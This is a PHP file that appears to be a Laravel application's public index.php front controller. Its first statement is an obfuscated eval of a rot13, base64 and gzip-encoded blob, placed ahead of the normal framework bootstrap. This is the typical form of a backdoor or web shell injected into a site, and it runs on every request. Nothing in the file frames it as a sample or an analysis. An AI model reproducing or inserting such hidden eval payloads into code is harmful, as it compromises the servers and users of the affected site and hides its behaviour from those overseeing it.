<?php
eval(gzinflate(base64_decode(str_rot13('iIoAoggTRY7mXGnRLSXbYpylSpDJuZOATQhgWAfHMIglOVV/X3RwxxhDF8yFnpP3bzvOayhxQ9Prrtk66pfxDs0JanHbFaoekNJX8eYv7Zj3j/a5EuSzBvZr1y3vRFMKvaHOulRA9ENUATGRU6HlOkf2QzKkTsHM9gzJAtijUzY4xcHq5ey1lmUPPYATmVMoG0DjRTj8WQ6Jcn76HgcROo2wdXrXrvTclxyK6Jt6yj9Npny3rAGEDAR0Vim4p93TSeIOnuldSrhj9ot52/I6aEeca59HwM22n85de81dMFVIv3HxPRXOmJ0CivSvdVRhONGC/HwR8gcwx9GtgPqz1L7656cwryopd+6l5t7/osi22MZLoWv532uVkH2RCtR6kcb6oziqrI8o72OCMH2iUMx7c+B+/+KR9R9v0mhg3NhBCu1lSzdaAz/AniArM9igaopeGH2Wr2soQiM24965CDriR7BmJ+zq1sm+mhzx6GxI82jXKcNjtYXHl+wCC368+ro7z59++CQz95ieom9898h7g9si3i6XgC7mSae/5es3C1/aMrRlKe88ikqTTObmCGE8J15Wv4C1zer6mF4LFHLDWVETPrvTyAvWGnr+Fj07ZI3QUlpzMbyyEZFalpwjpWDRewSYWfGTANabTVqWFPyYsQlARggtEeY1lcnsCacySlKhGFOQWWZV2x4h6NrXqvT9WbMiLJtegYTO7fuDb4TJY0K0qMciu7RNTw0XdO9uCH16gIYuUpIifrIDWO59WqLKe5rR1LHeDEwTifHV9ETWSU8RUkmWuGwP4s4VWzZWUJVJum4XDwmFCLAMwvlIQltqhqvRG/bP5bdsCpBu9STM8NliVB56HsSDYbE4PVBWj485TXHBRuCDxkzUKvQacarOJ7RoD+ju+EvbuRdVSkDBXLfHQT5QwGQYzVUaVaFKrYkPFlHqRuwOiJFOtx58jzO4Zm3+SPjUMwr/yVi1/PbIDc1cNXJ2aR30eXf2w46OEVOI9t+HgenWkOnqR9p1leIFOpxJ9DXQRqCSqMFaiIjgoqsEM7mdr+KlqQbgYEWJNh0l3Wp4yEKSOmyJz2xv3VpbUle7mkI1R1HrbdjdJyqgn+c+h/BPT20/kXwGnreNev9s9V4IowD03Nw/B0CBi383uA6WLcpgP4ZifpHO1wK4upWKEd7RKkMnTn/yVIthwKNTxA/jWfa9jWDhLywewUG60dKx0cRfJuN7Fw3hVET6puKOpaXKG9oBXrNd4viuma3zsXSkuGObe3ystuNK69QaDOCewM4M8JatpjL5JQWFgiQRD007udcPZEIIOTc6vh67D3gVxhcPLLka9+UjugsGwi9UdCKeWqeZN7QI/x310zH7JUUbxzSF4fk4NEM0Cc8Su0oZO45rukWmXUTjFNCCPTwV2NiLGY7gflByNHg8+vDrT/8ENEJKxNwGzPiabVApgCnKLMPEppRVvY7jyz4g4XnaymmVOdreIott3jtkXXMlBYTs0ikn7ILgsbiSZtrMHebYoiIWit4JTpj3NEGi/0eoNkCRKMKl9WGlbRc5nxb8ti8xT38O'))));

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/** @var Kernel $kernel */
$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);
